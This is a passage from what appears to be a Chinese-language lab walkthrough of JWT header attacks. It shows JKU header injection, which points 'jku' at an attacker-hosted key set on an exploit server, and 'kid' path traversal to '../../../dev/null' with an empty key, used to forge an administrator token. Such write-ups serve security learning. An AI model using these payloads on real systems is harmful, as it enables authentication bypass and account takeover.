style="color:#e3116c">&quot;jkFNpj5eafWczBE5jRkF4hIzErrMk9o7iYUMcF1DTzS_XkF7NMP-0PIMH4kgNeCMu3UorWsQV3XZZA8KzujVEjKxRBPMDsfQh5FKpqUl9QhFtlBkw73Ej1DCH3xtDZMKiPNTMOkWbe811c_UJ9a9Hx_JkXhCvMruOIRl9mKwTt-teKRquGLuvmRxiSvPxnL2LPU5Pf4mJhcGYEsEobI6kjlIXbeQNr1esFmk3IvBrMGEXj_xpWwWfQ-iiP8Asiur5yAbHNMk7gLyEGY7ajwtlUH0XI2k4aECC3Izx6FGZuF5lvSCUAxnHWD6zPT7jXX6GIWStjY0trnpUKr4SZCmKQ&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20250519153945030" src="/assets/images/image-20250519153945030-1269fd0ec9116ec7f600c7270c8c11bf.png" width="1849" height="770" class="img_ev3q"></p>
<p>这些参数结合在一起形成了一个完整的<strong>RSA公钥</strong>，能够用于加密数据或验证签名</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jku-头部注入">JKU 头部注入<a href="#jku-头部注入" class="hash-link" aria-label="JKU 头部注入的直接链接" title="JKU 头部注入的直接链接">​</a></h3>
<p>复制出来公钥<code>JWK</code></p>
<p><img decoding="async" loading="lazy" alt="image-20250519173605266" src="/assets/images/image-20250519173605266-5a3f8d5316cf26c8d801a20fca277278.png" width="923" height="395" class="img_ev3q"></p>
<p>内容如下格式：</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;kty&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;RSA&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;e&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;AQAB&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1e00189d-3bc9-49a5-9605-03f0df893a5c&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;n&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;jkFNpj5eafWczBE5jRkF4hIzErrMk9o7iYUMcF1DTzS_XkF7NMP-0PIMH4kgNeCMu3UorWsQV3XZZA8KzujVEjKxRBPMDsfQh5FKpqUl9QhFtlBkw73Ej1DCH3xtDZMKiPNTMOkWbe811c_UJ9a9Hx_JkXhCvMruOIRl9mKwTt-teKRquGLuvmRxiSvPxnL2LPU5Pf4mJhcGYEsEobI6kjlIXbeQNr1esFmk3IvBrMGEXj_xpWwWfQ-iiP8Asiur5yAbHNMk7gLyEGY7ajwtlUH0XI2k4aECC3Izx6FGZuF5lvSCUAxnHWD6zPT7jXX6GIWStjY0trnpUKr4SZCmKQ&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将他放到<code>keys</code>集合里</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;keys&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;kty&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;RSA&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;e&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;AQAB&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1e00189d-3bc9-49a5-9605-03f0df893a5c&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;n&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;jkFNpj5eafWczBE5jRkF4hIzErrMk9o7iYUMcF1DTzS_XkF7NMP-0PIMH4kgNeCMu3UorWsQV3XZZA8KzujVEjKxRBPMDsfQh5FKpqUl9QhFtlBkw73Ej1DCH3xtDZMKiPNTMOkWbe811c_UJ9a9Hx_JkXhCvMruOIRl9mKwTt-teKRquGLuvmRxiSvPxnL2LPU5Pf4mJhcGYEsEobI6kjlIXbeQNr1esFmk3IvBrMGEXj_xpWwWfQ-iiP8Asiur5yAbHNMk7gLyEGY7ajwtlUH0XI2k4aECC3Izx6FGZuF5lvSCUAxnHWD6zPT7jXX6GIWStjY0trnpUKr4SZCmKQ&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后将的上面的内容放到服务器上</p>
<p><img decoding="async" loading="lazy" alt="image-20250519173753853" src="/assets/images/image-20250519173753853-d7a4fc9ccc9db8d1c02d191568005bb6.png" width="1546" height="260" class="img_ev3q"></p>
<p>设置头部添加<code>JKU</code>参数</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1e00189d-3bc9-49a5-9605-03f0df893a5c&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;alg&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;RS256&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;jku&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;https://exploit-0ac0004c046975f58112104101d40092.exploit-server.net/exploit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后用这个公钥重新签名</p>
<p><img decoding="async" loading="lazy" alt="image-20250519173912126" src="/assets/images/image-20250519173912126-94554e9bd4d1b34552a1a960231c1138.png" width="1220" height="759" class="img_ev3q"></p>
<p>成功</p>
<p><img decoding="async" loading="lazy" alt="image-20250519155744097" src="/assets/images/image-20250519155744097-8033308d68932831bff1aebb16e4abc1.png" width="1854" height="697" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="kid-头部路径遍历">kid 头部路径遍历<a href="#kid-头部路径遍历" class="hash-link" aria-label="kid 头部路径遍历的直接链接" title="kid 头部路径遍历的直接链接">​</a></h3>
<p><code>kid</code>是服务器用于识别用那个密钥的，他可能是数据库中的数据，也可能是一个文件名</p>
<p>新建个<code>JWK</code>,让<code>k</code>参数为空的base64编码</p>
<p><img decoding="async" loading="lazy" alt="image-20250521222322757" src="/assets/images/image-20250521222322757-a12481e33b004fd3c07437953381ac7e.png" width="770" height="480" class="img_ev3q"></p>
<p>修改sub为管理员，<code>kid</code>指向<code>../../../dev/null</code>，然后进行签名</p>
<p><img decoding="async" loading="lazy" alt="image-20250521222432292" src="data:image/png;base64,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